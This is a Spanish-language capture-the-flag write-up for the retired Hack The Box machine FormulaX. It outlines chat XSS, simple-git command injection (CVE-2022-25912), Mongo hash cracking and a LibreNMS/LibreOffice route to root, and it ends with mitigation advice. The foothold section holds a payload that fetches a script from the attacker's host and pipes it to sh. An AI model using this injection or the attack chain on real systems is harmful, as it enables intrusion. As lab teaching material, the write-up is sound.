---
machine: FormulaX
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xss, simple-git, mongodb, librenms, libreoffice]
---

# FormulaX — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un chat con Socket.IO refleja mensajes y permite XSS para leer el historial del administrador, que revela un subdominio. Allí, `simple-git` es vulnerable a inyección de comandos (CVE-2022-25912). La base Mongo entrega hashes, y LibreNMS/LibreOffice encadenan la escalada hasta root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP y `3000/tcp` Node.js.
- Servicios: Aplicación de chat, panel de informes y LibreNMS interno.
- Tecnologías: Node.js, Socket.IO, simple-git, MongoDB, SNMP, LibreOffice.

## Enumeración

- `formulax.htb` con chat en Socket.IO.
- Subdominio de informes revelado en el historial del administrador.
- Formulario que clona repositorios con `simple-git`.
- LibreNMS y MongoDB en la red interna.

## Foothold

Se inyecta JavaScript en el chat para exfiltrar la conversación del administrador. El subdominio encontrado usa una versión vulnerable de `simple-git`; se envía una URL con opciones de Git que ejecutan un comando.

```bash
# XSS en el chat para leer el historial del administrador
curl -s http://formulax.htb/chat
# Payload de simple-git (CVE-2022-25912)
curl -s -b cookies.txt -X POST http://reports.formulax.htb/api/clone \
  -d 'repo=ext::sh -c "curl http://<IP>/s | sh"'
```

## Movimiento lateral

La shell permite leer la base Mongo y crackear el hash de un usuario; esa contraseña se reutiliza para el siguiente salto. LibreNMS aporta más credenciales y acceso al host.

## Escalada de privilegios

Una trampa SNMP provoca XSS en LibreNMS y permite ejecutar acciones como un usuario con más privilegios. La configuración compartida lleva a una cuenta capaz de invocar la API de LibreOffice Calc, que ejecuta comandos como root.

```bash
mongosh mongodb://127.0.0.1/formulax --eval 'db.users.find()'
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
snmpwalk -v2c -c public <IP>
# Encadenar la XSS de LibreNMS y la API de LibreOffice para ejecutar el comando final
```

## Evidencia

- Historial del administrador exfiltrado por XSS.
- Callback del comando de `simple-git`.
- Hash crackeado y acceso a LibreNMS; shell de root.

## Lecciones aprendidas

- Los chats internos son una fuente de vhosts y credenciales.
- Una dependencia Git vulnerable convierte una URL en ejecución.
- La cadena SNMP/XSS/API demuestra que los paneles internos también son superficie.

## Mitigación y detección

- Escapar mensajes y usar CSP estricta en el chat.
- Actualizar `simple-git` y validar URLs contra esquemas permitidos.
- Segmentar LibreNMS, rotar credenciales y no ejecutar LibreOffice como root.

## Referencias

- [0xdf — FormulaX](https://0xdf.gitlab.io/2024/08/17/htb-formulax.html)
- [IppSec — FormulaX](https://www.youtube.com/watch?v=k8eGslngxR4)
- [Hack The Box — FormulaX](https://app.hackthebox.com/machines/formulax)
